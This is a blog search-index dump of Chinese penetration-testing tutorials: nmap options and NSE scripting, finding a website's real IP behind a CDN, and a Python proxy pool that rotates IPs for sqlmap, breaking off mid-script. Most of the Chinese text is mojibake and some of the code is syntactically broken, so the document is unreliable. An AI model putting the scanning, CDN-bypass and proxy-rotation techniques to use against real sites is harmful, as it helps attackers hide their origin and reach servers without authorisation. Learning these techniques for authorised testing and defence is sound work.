æ‰«æ) *TCP connect()é»˜è®¤çš„æ‰«ææ–¹å¼ï¼Œå®Œæˆä¸‰æ¬¡æ¡æ‰‹-sU ï¼ˆUDP æ‰«æï¼‰ç”¨æ¥æ¢æµ‹ç›®çš„çš„UDPç«¯å£ï¼Œä¸éœ€è¦å‘é€ä»»ä½•çš„SYNåŒ…ï¼Œå‘é€UDPæ•°æ®åŒ…åˆ°ç›®çš„ä¸»æœºç­‰å¾…å“åº”-sA ï¼ˆACKæ‰«æï¼‰ *ä¸‰æ¬¡æ¡æ‰‹ ç”¨äºæ¢æµ‹å‡ºé˜²ç«å¢™è¿‡æ»¤ç«¯å£ å®é™…æ¸—é€ä¸­æ²¡å¤šå¤§ç”¨-sV ï¼ˆç‰ˆæœ¬æ¢æµ‹ï¼‰-A ç»¼åˆæ‰«æï¼ˆç³»ç»Ÿæ¢æµ‹ï¼Œç‰ˆæœ¬æ¢æµ‹ï¼Œè·¯ç”±è¿½è¸ªä»¥åŠä¸€äº›å¸¸ç”¨è„šæœ¬çš„æ‰«æï¼‰-O ï¼ˆå¯ç”¨æ“ä½œç³»ç»Ÿæ£€æµ‹ï¼‰-vè¯¦ç»†é€‰é¡¹è¯´æ˜-P0 [æŒ‡å®šç«¯å£] (æ— pingæ‰«æ)-PU [æŒ‡å®šç«¯å£] (udp pingæ‰«æ)-PS [æŒ‡å®šç«¯å£] (TCP SYN ping æ‰«æ)-PA [æŒ‡å®šç«¯å£] (tcp ack pingæ‰«æ)-PI ä½¿ç”¨çœŸæ­£çš„pingICMP echoè¯·æ±‚æ¥æ‰«æç›®æ ‡ä¸»æœºæ˜¯å¦æ­£åœ¨è¿è¡Œ-iL æŒ‡å®šæ‰«æä¸»æœºåˆ—è¡¨-iR éšæœºé€‰æ‹©ç›®æ ‡â€“exclude æ’é™¤æ‰«æç›®æ ‡â€“excludefile æ’é™¤æ–‡ä»¶ä¸­ç›®æ ‡åˆ—è¡¨-n (ä¸ç”¨åŸŸåè§£æ)-R (ä¸ºæ‰€æœ‰ç›®æ ‡è§£æåŸŸå)-T æ—¶é—´ä¼˜åŒ–ï¼ˆæ¯éš”å¤šä¹…å‘ä¸€æ¬¡åŒ… ï¼‰ -T5 æœ€å¿« -T0 æœ€æ…¢ï¼ˆ5é€‚åˆå±€åŸŸç½‘ï¼‰-F å¿«é€Ÿæ‰«æ-e æŒ‡å®šç½‘ç»œæ¥å£-M è®¾ç½®tcpæ‰«æçº¿ç¨‹-iL æ–‡ä»¶ æŒ‡å®šä¸€ä¸ªæ–‡æœ¬å†…çš„æ‰€æœ‰ä¸»æœºnmapçš„è¾“å‡ºï¼šoNï¼ŒoXï¼ŒoSï¼ŒoGï¼ˆç»“æœä¸ºä¸€èˆ¬æ¨¡å¼ã€‚XMLï¼Œkiddi3ï¼Œgrepableæ ¼å¼ï¼‰nmapè¾“å‡º ipï¼šport æ ¼å¼ï¼šnmap -vv -p 80 192.168.1.0/24 | grep â€œDiscovered open portâ€ | awk &#123;â€˜print $6â€:â€$4â€™&#125; | awk -F/ &#123;â€˜print $1â€™&#125; &gt; output.txt","categories":[{"name":"å·¥å…·","slug":"å·¥å…·","permalink":"http://yoursite.com/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"NMAP","slug":"NMAP","permalink":"http://yoursite.com/tags/NMAP/"}]},{"title":"NSEç¼–å†™","slug":"NSEç¼–å†™","date":"2020-06-27T06:52:11.000Z","updated":"2020-06-27T06:53:26.030Z","comments":true,"path":"2020/06/27/NSEç¼–å†™/","link":"","permalink":"http://yoursite.com/2020/06/27/NSE%E7%BC%96%E5%86%99/","excerpt":"","text":"NSEç®€ä»‹ Nmap ä¸€æ¬¾æ ‡å¿—æ€§çš„è·¨å¹³å°æ‰«æå™¨ã€‚å®ƒçš„åŸæ„ä¸ºNetwork Mapperï¼ˆç½‘ç»œæ˜ å°„å™¨ï¼‰ï¼Œå…·æœ‰ç›¸å½“å¼ºå¤§çš„æ‰«æåŠŸèƒ½ã€‚Nmapè¿˜å¯æ ¹æ®NSE (Nmap scripting Engine)çš„è„šæœ¬è¿›è¡Œå¤§é‡æ¸—é€å·¥ä½œï¼Œè¿™ç§è„šæœ¬æ˜¯åŸºäºLuaç¼–ç¨‹è¯­è¨€ã€‚æ­£æ˜¯NSEï¼Œä½¿å¾—Nmapä¸å†æ™®é€šã€‚ Nmapçš„ç›®å½•ç»“æ„ Linux Windows ä¸»è¦å…³æ³¨ä¸¤ä¸ªç›®å½•ï¼š neslibå­˜æ”¾ç€å„ç§åº“æ–‡ä»¶ scriptå­˜æ”¾ç€NSEè„šæœ¬ nmapè„šæœ¬å’Œåº“æ–‡ä»¶æ‰‹å†Œï¼šhttps://nmap.org/nsedoc/ NSEä¸­çš„åº“æ–‡ä»¶ NSEä¸­çš„åº“æ–‡ä»¶å®ç°äº†ä»£ç çš„åˆ†ç¦»å’Œé‡æ„ï¼Œæœ‰åŠ©äºè„šæœ¬çš„å¼€å‘ï¼Œå…¶å­˜æ”¾åœ¨nselibæ–‡ä»¶å¤¹ä¸­ã€‚ åº“æ–‡ä»¶çš„ç¼–å†™ åˆ›å»ºä¸€ä¸ªåº“æ–‡ä»¶ä¿å­˜ä¸ºdemo.luaï¼Œç”¨äºå¯¹äºä¼ å…¥çš„å‚æ•° è¿”å› è¿™ä¸ªç«¯å£ æ˜¯å¼€å¯çš„ã€‚ 123function Test( port ) return string.format(&quot;The port &#39;%s&#39; is open&quot;,port)end åœ¨è„šæœ¬æ–‡ä»¶ä¸­å¼•å…¥è¿™ä¸ªåº“æ–‡ä»¶ï¼Œå¼•å…¥åº“æ–‡ä»¶çš„æ ¼å¼ä¸€èˆ¬ä¸º local åº“æ–‡ä»¶å = require â€œåº“æ–‡ä»¶åâ€ ä¸šç•Œäººå£«ç§°ï¼Œåœ¨luaä¸­ï¼Œå¦‚æœæ˜¯ä¸€äº›ç»å¸¸ç”¨åˆ°çš„å…¨å±€å‡½æ•°ï¼Œå¯ä»¥ç”³æ˜ä¸ºlocalå±€éƒ¨å˜é‡ï¼Œè¿™æ ·åšå¯ä»¥æå‡æ•ˆç‡ã€‚ åœ¨è„šæœ¬ä¸­ä½¿ç”¨æ­¤åº“æ–‡ä»¶ä¸­çš„å‡½æ•°ã€‚ 123456789101112local shortport &#x3D; require &quot;shortport&quot;local demo &#x3D; require &quot;demo&quot;description &#x3D; [[neslib demo test]]categories &#x3D; &#123;&quot;default&quot;&#125;portrule &#x3D; function(host,port) return port.protocol &#x3D;&#x3D; &quot;tcp&quot; and port.number &#x3D;&#x3D; 30081 and port.state &#x3D;&#x3D;&quot;open&quot;endaction &#x3D; function(host, port) return Test(port.number)end NSEç¼–å†™è§„åˆ™ NSEè„šæœ¬ç¼–å†™æµç¨‹ å¤§è‡´åˆ†ä¸ºå››æ­¥ï¼š å¯¼å…¥è„šæœ¬æ‰€éœ€åº“ è„šæœ¬æè¿°ä¿¡æ¯åŠåˆ†ç±» ruleç±»å‹ï¼šè„šæœ¬çš„è§¦å‘è§„åˆ™ actionï¼šè„šæœ¬å…·ä½“æ‰§è¡Œå†…å®¹ï¼Œruleè§¦å‘è§„åˆ™ä¸ºçœŸæ—¶æ‰§è¡Œactionå®šä¹‰çš„å‡½æ•° Ruleå››ç§ç±»å‹ Ruleï¼šç”¨äºæè¿°è„šæœ¬çš„è§¦å‘è§„åˆ™ï¼Œè¿”å›å€¼åªæœ‰trueå’Œfalseä¸¤ç§ã€‚è¿”å›å€¼å†³å®šäº†åé¢actionå¯¹åº”çš„å‡½æ•°æ˜¯å¦æ‰§è¡Œï¼Œæ³¨æ„ï¼štrue(æ‰§è¡Œ),flase(ä¸æ‰§è¡Œ)ã€‚å®ƒæœ‰å››ç§ç±»å‹åˆ†åˆ«æ˜¯ prerule()ï¼šä¸æ¥æ”¶å‚æ•°ï¼Œè„šæœ¬åªè¿è¡Œä¸€æ¬¡ï¼Œåœ¨ä¸»æœºå‘ç°ä¹‹å‰ï¼Œå‘ç”Ÿåœ¨é¢„æ‰«æé˜¶æ®µã€‚è¿”å›çš„å€¼æ°¸è¿œä¸ºçœŸã€‚ hostrule(host)ï¼šè®¾å®šå‚æ•°ä¸ºç›®æ ‡çš„ipåœ°å€æˆ–ä¸»æœºåï¼Œnmapå®Œæˆäº†ä¸»æœºå‘ç°ä¹‹åå†è¿è¡Œè„šæœ¬ã€‚ portrule(host,port)ï¼šè®¾å®šå‚æ•°éœ€è¦ä¸»æœºä»¥åŠç«¯å£ã€‚åœ¨ç«¯å£æ‰«ææ—¶ï¼Œæ¯ä¸ªç«¯å£è¿è¡Œä¸€æ¬¡ï¼Œå¤„äºopenï¼Œopen|filteredï¼Œæˆ–è€…unfilteredçŠ¶æ€çš„æ‰€æœ‰ç«¯å£ã€‚ postrule()ï¼šä¸æ¥æ”¶å‚æ•°ï¼Œnmapå®Œæˆæ‰€æœ‰ä¸»æœºå·²ç»è¢«æ‰«æåï¼Œåœ¨è„šæœ¬çš„åæ‰«æé˜¶æ®µã€‚è¿”å›çš„å€¼æ°¸è¿œä¸ºçœŸã€‚ ä¸¾ä¸ªä¾‹å­ï¼š åœ¨æ‰«æä¹‹å‰è§¦å‘è„šæœ¬ï¼Œæ‰“å°I Love China. 12345678910111213description = [[test]]author = \"Edsion\"license = \"Same as Nmapâ€â€See http://nmap.org/book/manâ€legal.html\"categories = &#123;\"default\",\"safe\"&#125;prerule = function(host,port)return trueendaction = function(host, port)return \"I Love China.\"end è°ƒè¯•æ¨¡å¼ åœ¨æµ‹è¯•é˜¶æ®µæˆ‘ä»¬éš¾å…ä¼šå‡ºç°é”™è¯¯,é‚£å‡è®¾æˆ‘ä»¬å‡ºç°äº†é”™è¯¯æˆ‘ä»¬åº”è¯¥å¦‚ä½•è§£å†³å‘¢ã€‚è¿™æ—¶æˆ‘ä»¬éœ€è¦å€ŸåŠ©Nmapçš„è°ƒè¯•æ¨¡å¼è¿›è¡Œè°ƒè¯•ï¼Œåªéœ€è¦åŠ ä¸Š-dé€‰é¡¹å³å¯è¿›å…¥è°ƒè¯•æ¨¡å¼ï¼Œé‚£ä¸€èˆ¬é€‰æ‹©-d 3ï¼Œ3ä»£è¡¨çš„æ˜¯ç­‰çº§ï¼Œç­‰çº§è¶Šé«˜ï¼Œè¶Šè¯¦ç»†ã€‚ nmap API nmapä¸­APIçš„æ ¸å¿ƒåŠŸèƒ½å°±æ˜¯å‘è„šæœ¬æä¾›ä¸»æœºå’Œç«¯å£çš„ä¿¡æ¯ã€‚ ä¸¤ä¸ªlua tableç±»å‹çš„å‚æ•°ï¼šhost table ã€ port table host tableç±»å‹ host.os æ“ä½œç³»ç»Ÿä¿¡æ¯ host.ip tagret(ç›®æ ‡ä¸»æœº)å¯¹åº”çš„ip,ä¾‹å¦‚ä¸‹é¢çš„127.0.0.1 host.name tagertåœ¨å‘½ä»¤è¡Œå¯¹åº”çš„åå­—ï¼Œä¾‹å¦‚ä¸‹é¢çš„zzcms.im host.targetname åŒä¸Šhost.nameï¼Œæˆ‘ä¸ªäººæ˜¯è¿™æ ·è®¤ä¸ºçš„ host.directly_connected åˆ¤æ–­ç›®æ ‡ä¸»æœºæ˜¯å¦ä¸æœ¬æœºåœ¨åŒä¸€ä¸ªå­ç½‘ host.mac_addr macåœ°å€ ï¼ˆå¿…é¡»æ˜¯åŒä¸€å­ç½‘çš„è®¾å¤‡è¿™ä¸ªå‘½ä»¤æ‰æœ‰æ•ˆï¼‰ port tableç±»å‹ port.number ç«¯å£å· port.protocol åè®® port.service æœåŠ¡ httpæˆ–https port.version ç‰ˆæœ¬ä¿¡æ¯ port.state ç«¯å£çŠ¶æ€ httpåº“å‚æ•°æ‰©å±• http åº“ get() å‘èµ·getè¯·æ±‚ï¼Œè¯·æ±‚ç»“æœä»¥ä¸€ä¸ªtableçš„å½¢å¼è¿”å› host è¦è¯·æ±‚çš„ä¸»æœº path è¦æ£€ç´¢çš„è·¯å¾„ options å¯é€‰ï¼Œå…è®¸è°ƒç”¨è€…æ§åˆ¶socket,è¯·æ±‚å¤´çš„table port è¦æ£€ç´¢çš„ç«¯å£ post() å‘èµ·postè¯·æ±‚ï¼Œè¯·æ±‚ç»“æœä»¥ä¸€ä¸ªtableçš„å½¢å¼è¿”å› ignored å‘åå…¼ç”¨ï¼Œä¸€èˆ¬å¡«å†™nilï¼Œå¿½ç•¥å³å¯ postdata postæ•°æ®ï¼Œå­—ç¬¦ä¸²æˆ–è€…tableæ ¼å¼ host è¦è¯·æ±‚çš„ä¸»æœº path è¦æ£€ç´¢çš„è·¯å¾„ options å¯é€‰ï¼Œå…è®¸è°ƒç”¨è€…æ§åˆ¶socket,è¯·æ±‚å¤´,è¶…æ—¶æ—¶é—´çš„table port è¦æ£€ç´¢çš„ç«¯å£ NSEè„šæœ¬åˆ†ç±» è„šæœ¬ç±»åˆ« æè¿° auth ä¸ç”¨æˆ·è®¤è¯ç›¸å…³çš„NSEè„šæœ¬ broadcast åœ¨å±€åŸŸç½‘å†…æ¢æŸ¥æ›´å¤šæœåŠ¡å¼€å¯çŠ¶å†µï¼Œå¦‚dhcp/dns/sqlserverç­‰æœåŠ¡ brute æš´åŠ›ç ´è§£ default é»˜è®¤ï¼Œæ‰§è¡Œè„šæœ¬ï¼ˆ-Aæˆ–è€…-sCï¼‰ discovery ä¸ä¸»æœºå’ŒæœåŠ¡å‘ç°ç›¸å…³çš„è„šæœ¬ dos ä¸æ‹’ç»æœåŠ¡æ”»å‡»æœ‰å…³çš„è„šæœ¬ exploit åˆ©ç”¨å·²çŸ¥çš„æ¼æ´å…¥ä¾µç³»ç»Ÿ external åˆ©ç”¨ç¬¬ä¸‰æ–¹çš„æ•°æ®åº“æˆ–èµ„æºï¼Œä¾‹å¦‚è¿›è¡Œwhoisè§£æ fuzzer æ¨¡ç³Šæµ‹è¯•çš„è„šæœ¬ï¼Œå‘é€å¼‚å¸¸çš„åŒ…åˆ°ç›®æ ‡æœºï¼Œæ¢æµ‹å‡ºæ½œåœ¨æ¼æ´ intrusive å…¥ä¾µæ€§çš„è„šæœ¬ï¼Œæ­¤ç±»è„šæœ¬å¯èƒ½å¼•å‘å¯¹æ–¹çš„IDS/IPSçš„è®°å½•æˆ–å±è”½ malware æ¢æµ‹ç›®æ ‡æœºæ˜¯å¦æ„ŸæŸ“äº†ç—…æ¯’ã€å¼€å¯äº†åé—¨ç­‰ä¿¡æ¯ safe æ­¤ç±»ä¸intrusiveç›¸åï¼Œå±äºå®‰å…¨æ€§è„šæœ¬ vuln è´Ÿè´£æ£€æŸ¥ç›®æ ‡æœºæ˜¯å¦æœ‰å¸¸è§çš„æ¼æ´ï¼ˆVulnerabilityï¼‰ï¼Œå¦‚æ˜¯å¦æœ‰MS08_067 version è´Ÿè´£å¢å¼ºæœåŠ¡ä¸ç‰ˆæœ¬æ‰«æï¼ˆVersion Detectionï¼‰åŠŸèƒ½çš„è„šæœ¬ NSEè„šæœ¬ä½¿ç”¨ 123456789101112131415161718192021ç›´æ¥åŠ è„šæœ¬åç§°nmap --script http-title &lt;target&gt;nmap --script http-titleï¼Œhttp-methods &lt;target&gt;ç±»åˆ«nmap --script exploit &lt;target&gt;æ‚¨ä¹Ÿå¯ä»¥ç”¨é€—å·åˆ†éš”å®ƒä»¬æ¥è¿è¡Œå¤šä¸ªç±»åˆ«ï¼šnmap --script discovery,intrusive &lt;target&gt;è·¯å¾„æˆ–æ–‡ä»¶åï¼ˆæ–‡ä»¶å¤¹ï¼‰nmap --script /path/to/script.nse &lt;target&gt;nmap --script /path/to/script.nse,/another/path/script2.nse &lt;target&gt;è¡¨è¾¾å¼nmap -sV --script \"not exploit\" &lt;target&gt;nmap --script \"notï¼ˆintrusive or dos or exploitï¼‰\" -sV &lt;target&gt;é€šé…ç¬¦nmap --script \"snmp- *\" &lt;target&gt;ä¸ºè„šæœ¬æä¾›å‚æ•° --script-args=x=x,y=y","categories":[{"name":"å·¥å…·","slug":"å·¥å…·","permalink":"http://yoursite.com/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"NMAP","slug":"NMAP","permalink":"http://yoursite.com/tags/NMAP/"}]},{"title":"ç»•è¿‡CDNå¯»æ‰¾çœŸå®IP","slug":"ç»•è¿‡CDN","date":"2020-06-23T04:17:11.000Z","updated":"2020-07-04T14:05:44.404Z","comments":true,"path":"2020/06/23/ç»•è¿‡CDN/","link":"","permalink":"http://yoursite.com/2020/06/23/%E7%BB%95%E8%BF%87CDN/","excerpt":"","text":"ç›®å‰å¾ˆå¤šç«™ç‚¹å‡ºäºç”¨æˆ·ä½“éªŒå’Œå®‰å…¨çš„è§’åº¦ï¼Œä½¿ç”¨CDNåŠ é€Ÿï¼Œå°†åŸŸåè§£æåˆ°CDNï¼Œè¿™æ—¶å€™å°±éœ€è¦ç»•è¿‡CDNæ¥æŸ¥æ‰¾çœŸå®IPã€‚ ä¸€ã€DNSå†å²è§£æè®°å½• æŸ¥è¯¢åŸŸåçš„å†å²è§£æè®°å½•ï¼Œæ‰¾ç½‘ç«™ä½¿ç”¨CDNå‰çš„è§£æè®°å½•ï¼Œä»è€Œè·å–çœŸå®ipï¼Œç›¸å…³æŸ¥è¯¢çš„ç½‘ç«™æœ‰ï¼š 123456iphistoryï¼šhttps://viewdns.info/iphistory/DNSæŸ¥è¯¢ï¼šï¼ˆhttps://dnsdb.io/zh-cn/ï¼‰å¾®æ­¥åœ¨çº¿ï¼šï¼ˆhttps://x.threatbook.cn/ï¼‰åŸŸåæŸ¥è¯¢ï¼šï¼ˆhttps://site.ip138.com/ï¼‰DNSå†å²æŸ¥è¯¢ï¼šï¼ˆhttps://securitytrails.com/ï¼‰Netcraftï¼šhttps://sitereport.netcraft.com/?url=github.com äºŒã€å­åŸŸå å¾ˆå¤šæ—¶å€™ï¼Œä¸€äº›é‡è¦çš„ç«™ç‚¹ä¼šåšCDNï¼Œè€Œä¸€äº›å­åŸŸåç«™ç‚¹å¹¶æ²¡æœ‰åŠ å…¥CDNï¼Œè€Œä¸”è·Ÿä¸»ç«™åœ¨åŒä¸€ä¸ªCæ®µå†…ï¼Œè¿™æ—¶å€™ï¼Œå°±å¯ä»¥é€šè¿‡æŸ¥æ‰¾å­åŸŸåæ¥æŸ¥æ‰¾ç½‘ç«™çš„çœŸå®IPã€‚ å¸¸ç”¨çš„å­åŸŸåæŸ¥æ‰¾æ–¹æ³•å’Œå·¥å…·ï¼š æœç´¢å¼•æ“æŸ¥è¯¢ï¼šå¦‚Googleã€baiduã€Bingç­‰ä¼ ç»Ÿæœç´¢å¼•æ“ï¼Œsite:baidu.com inurl:baidu.comï¼Œæœtarget.com|å…¬å¸åå­—ã€‚ åœ¨çº¿æŸ¥è¯¢ç½‘ç«™ï¼š 12345http:&#x2F;&#x2F;tool.chinaz.com&#x2F;subdomain&#x2F;http:&#x2F;&#x2F;i.links.cn&#x2F;subdomain&#x2F; http:&#x2F;&#x2F;subdomain.chaxun.la&#x2F;http:&#x2F;&#x2F;searchdns.netcraft.com&#x2F;https:&#x2F;&#x2F;www.virustotal.com&#x2F; å­åŸŸåçˆ†ç ´å·¥å…· 1234Layerå­åŸŸåæŒ–æ˜æœºwydomainï¼šhttps:&#x2F;&#x2F;github.com&#x2F;ring04h&#x2F;wydomain subDomainsBrute:https:&#x2F;&#x2F;github.com&#x2F;lijiejie&#x2F;Sublist3r:https:&#x2F;&#x2F;github.com&#x2F;aboul3la&#x2F;Sublist3r ä¸‰ã€ç½‘ç«™é‚®ä»¶å¤´ä¿¡æ¯ æ¯”å¦‚ï¼šé‚®ç®±æ³¨å†Œï¼Œé‚®ç®±æ‰¾å›å¯†ç ã€RSSé‚®ä»¶è®¢é˜…ç­‰åŠŸèƒ½åœºæ™¯ï¼Œé€šè¿‡ç½‘ç«™ç»™è‡ªå·±å‘é€é‚®ä»¶ï¼Œä»è€Œè®©ç›®æ ‡ä¸»åŠ¨æš´éœ²ä»–ä»¬çš„çœŸå®çš„IPï¼ŒæŸ¥çœ‹é‚®ä»¶å¤´ä¿¡æ¯ï¼Œè·å–åˆ°ç½‘ç«™çš„çœŸå®IPã€‚ å››ã€ç½‘ç»œç©ºé—´å®‰å…¨å¼•æ“æœç´¢ é€šè¿‡å…³é”®å­—æˆ–ç½‘ç«™åŸŸåï¼Œå°±å¯ä»¥æ‰¾å‡ºè¢«æ”¶å½•çš„IPï¼Œå¾ˆå¤šæ—¶å€™è·å–åˆ°çš„å°±æ˜¯ç½‘ç«™çš„çœŸå®IPã€‚ 123é’Ÿé¦—ä¹‹çœ¼ï¼šhttps:&#x2F;&#x2F;www.zoomeye.orgShodanï¼šhttps:&#x2F;&#x2F;www.shodan.ioFofaï¼šhttps:&#x2F;&#x2F;fofa.so äº”ã€åˆ©ç”¨SSLè¯ä¹¦ è¯ä¹¦é¢å‘æœºæ„(CA)å¿…é¡»å°†ä»–ä»¬å‘å¸ƒçš„æ¯ä¸ªSSL/TLSè¯ä¹¦å‘å¸ƒåˆ°å…¬å…±æ—¥å¿—ä¸­ï¼ŒSSL/TLSè¯ä¹¦é€šå¸¸åŒ…å«åŸŸåã€å­åŸŸåå’Œç”µå­é‚®ä»¶åœ°å€ã€‚å› æ­¤SSL/TLSè¯ä¹¦æˆä¸ºäº†æ”»å‡»è€…çš„åˆ‡å…¥ç‚¹ã€‚ SSLè¯ä¹¦æœç´¢å¼•æ“ï¼š 1https:&#x2F;&#x2F;censys.io&#x2F;ipv4?q&#x3D;github.com å…­ã€å›½å¤–ä¸»æœºè§£æåŸŸå å¤§éƒ¨åˆ† CDN å‚å•†å› ä¸ºå„ç§åŸå› åªåšäº†å›½å†…çš„çº¿è·¯ï¼Œè€Œé’ˆå¯¹å›½å¤–çš„çº¿è·¯å¯èƒ½å‡ ä¹æ²¡æœ‰ï¼Œæ­¤æ—¶æˆ‘ä»¬ä½¿ç”¨å›½å¤–çš„DNSæŸ¥è¯¢ï¼Œå¾ˆå¯èƒ½è·å–åˆ°çœŸå®IPã€‚ å›½å¤–å¤šPINGæµ‹è¯•å·¥å…·ï¼š 1234https:&#x2F;&#x2F;asm.ca.com&#x2F;zh_cn&#x2F;ping.phphttp:&#x2F;&#x2F;host-tracker.com&#x2F;http:&#x2F;&#x2F;www.webpagetest.org&#x2F;https:&#x2F;&#x2F;dnscheck.pingdom.com&#x2F; ä¸ƒã€å…¨ç½‘æ‰«æ é€šè¿‡Zmapã€masscanç­‰å·¥å…·å¯¹æ•´ä¸ªäº’è”ç½‘å‘èµ·æ‰«æï¼Œé’ˆå¯¹æ‰«æç»“æœè¿›è¡Œå…³é”®å­—æŸ¥æ‰¾ï¼Œè·å–ç½‘ç«™çœŸå®IPã€‚ ZMapå·ç§°æ˜¯æœ€å¿«çš„äº’è”ç½‘æ‰«æå·¥å…·ï¼Œèƒ½å¤Ÿåœ¨45åˆ†é’Ÿæ‰«éå…¨ç½‘ã€‚ 1https:&#x2F;&#x2F;github.com&#x2F;zmap&#x2F;zmap Masscanå·ç§°æ˜¯æœ€å¿«çš„äº’è”ç½‘ç«¯å£æ‰«æå™¨ï¼Œæœ€å¿«å¯ä»¥åœ¨å…­åˆ†é’Ÿå†…æ‰«éäº’è”ç½‘ã€‚ 1https:&#x2F;&#x2F;github.com&#x2F;robertdavidgraham&#x2F;masscan å…«ã€é…ç½®ä¸å½“å¯¼è‡´ç»•è¿‡ åœ¨é…ç½®CDNçš„æ—¶å€™ï¼Œéœ€è¦æŒ‡å®šåŸŸåã€ç«¯å£ç­‰ä¿¡æ¯ï¼Œæœ‰æ—¶å€™å°å°çš„é…ç½®ç»†èŠ‚å°±å®¹æ˜“å¯¼è‡´CDNé˜²æŠ¤è¢«ç»•è¿‡ã€‚ æ¡ˆä¾‹1ï¼šä¸ºäº†æ–¹ä¾¿ç”¨æˆ·è®¿é—®ï¼Œæˆ‘ä»¬å¸¸å¸¸å°†www.test.com å’Œ test.com è§£æåˆ°åŒä¸€ä¸ªç«™ç‚¹ï¼Œè€ŒCDNåªé…ç½®äº†www.test.comï¼Œé€šè¿‡è®¿é—®test.comï¼Œå°±å¯ä»¥ç»•è¿‡ CDN äº†ã€‚ æ¡ˆä¾‹2ï¼šç«™ç‚¹åŒæ—¶æ”¯æŒhttpå’Œhttpsè®¿é—®ï¼ŒCDNåªé…ç½® httpsåè®®ï¼Œé‚£ä¹ˆè¿™æ—¶è®¿é—®httpå°±å¯ä»¥è½»æ˜“ç»•è¿‡ã€‚","categories":[{"name":"æ¸—é€","slug":"æ¸—é€","permalink":"http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"æŠ€å·§","slug":"æŠ€å·§","permalink":"http://yoursite.com/tags/%E6%8A%80%E5%B7%A7/"}]},{"title":"SqlMapä»£ç†æ± ","slug":"ä»£ç†æ± ","date":"2020-06-22T07:16:21.000Z","updated":"2020-06-22T07:23:05.708Z","comments":true,"path":"2020/06/22/ä»£ç†æ± /","link":"","permalink":"http://yoursite.com/2020/06/22/%E4%BB%A3%E7%90%86%E6%B1%A0/","excerpt":"","text":"è·å–ä»£ç†æ±  è·å–ä»£ç†æ± ä½¿ç”¨äº†GIthubä¸Šçš„é¡¹ç›®ï¼šhttps://github.com/jhao104/proxy_pool ï¼Œå¹¶åˆ©ç”¨REDISå­˜å‚¨è·å–åˆ°çš„ä»£ç†åœ°å€ å¯åŠ¨é¡¹ç›® åœ¨cliç›®å½•ä¸‹é€šè¿‡ProxyPool.pyå¯åŠ¨ 12345# é¦–å…ˆå¯åŠ¨è°ƒåº¦ç¨‹åº&gt;&gt;&gt;python proxyPool.py schedule# ç„¶åå¯åŠ¨webApiæœåŠ¡&gt;&gt;&gt;python proxyPool.py webserver Api å¯åŠ¨è¿‡å‡ åˆ†é’Ÿåå°±èƒ½çœ‹åˆ°æŠ“å–åˆ°çš„ä»£ç†IPï¼Œå¯ä»¥ç›´æ¥åˆ°æ•°æ®åº“ä¸­æŸ¥çœ‹ï¼Œä¹Ÿå¯ä»¥é€šè¿‡apiè®¿é—®http://127.0.0.1:5010 æŸ¥çœ‹ã€‚ api method Description arg / GET apiä»‹ç» None /get GET éšæœºè·å–ä¸€ä¸ªä»£ç† None /get_all GET è·å–æ‰€æœ‰ä»£ç† None /get_status GET æŸ¥çœ‹ä»£ç†æ•°é‡ None /delete GET åˆ é™¤ä»£ç† proxy=host:ip ä¿å­˜ä»£ç† è‡ªå·±ç¼–å†™äº†ä¸ªå°è„šæœ¬å°†ProxyPool.pyè·å–åˆ°çš„ä»£ç†ä¿å­˜åœ¨ips.txtä¸­ get_proxy.pyï¼š 1234567891011121314151617import requestsdef get_proxy(): return requests.get(&quot;http:&#x2F;&#x2F;127.0.0.1:5010&#x2F;get_all&#x2F;&quot;).json()def delete_proxy(proxy): requests.get(&quot;http:&#x2F;&#x2F;127.0.0.1:5010&#x2F;delete&#x2F;?proxy&#x3D;&#123;&#125;&quot;.format(proxy))res &#x3D; requests.get(&quot;http:&#x2F;&#x2F;127.0.0.1:5010&#x2F;get_status&quot;).json()count &#x3D; res.get(&quot;useful_proxy&quot;)print(&quot;ç›®å‰ä»£ç†æ± ä¸­å…±è®¡ï¼š%sä¸ªä»£ç†.&quot; % count)f &#x3D; open(&quot;ips.txt&quot;, &quot;w&quot;)for i in range(count): b &#x3D; get_proxy()[i][&quot;proxy&quot;]f.write(b + &quot;\\n&quot;)f.close() æœ¬åœ°ä»£ç†è½¬å‘ å€Ÿç”¨å‰äººçš„æˆæœï¼Œå®ç°çš„æ•ˆæœæ˜¯å¯ç”¨æœ¬åœ°127.0.0.1:9999æœåŠ¡ï¼Œå°†ips.txtå†…çš„ä»£ç†è½¬å‘ç»™æœ¬åœ°å®¢æˆ·ç«¯ ips.pyï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144#!/usr/bin/env python# -*- coding: utf-8 -*-import socketfrom socket import errorimport threadingimport randomimport timelocaltime = time.asctime(time.localtime(time.time()))class ProxyServerTest: def __init__(self, proxyip): # æœ¬åœ°socketæœåŠ¡ self.ser = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.proxyip = proxyip def run(self): try: # æœ¬åœ°æœåŠ¡IPå’Œç«¯å£ self.ser.bind(('127.0.0.1', 9999)) # æœ€å¤§è¿æ¥æ•° self.ser.listen(5) except error as e: print(\"[-]The local service : \" + str(e)) return \"[-]The local service : \" + str(e) while True: try: # æ¥æ”¶å®¢æˆ·ç«¯æ•°æ® client, addr = self.ser.accept() print('[*]accept %s connect' % (addr,)) data = client.recv(1024) if not data: break print('[*' + localtime + ']: Accept data...') except error as e: print(\"[-]Local receiving client : \" + str(e)) return \"[-]Local receiving client : \" + str(e) while True: # ç›®æ ‡ä»£ç†æœåŠ¡å™¨ï¼Œå°†å®¢æˆ·ç«¯æ¥æ”¶æ•°æ®è½¬å‘ç»™ä»£ç†æœåŠ¡å™¨ mbsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) iplen = len(self.proxyip) proxyip = self.proxyip[random.randint(0, iplen - 1)] print(\"[!]Now proxy ip:\" + str(proxyip)) prip = proxyip[0] prpo = proxyip[1 try: mbsocket.settimeout(3) mbsocket.connect((prip, prpo)) except: print(\"[-]RE_Connect...\") continue break # except : # print(\"[-]Connect failed,change proxy ip now...\") # pass try: mbsocket.send(data) except error as e: print(\"[-]Sent to the proxy server : \" + str(e)) return \"[-]Sent to the proxy server : \" + str(e) while True: try: # ä»ä»£ç†æœåŠ¡å™¨æ¥æ”¶æ•°æ®ï¼Œç„¶åè½¬å‘å›å®¢æˆ·ç«¯ data_1 = 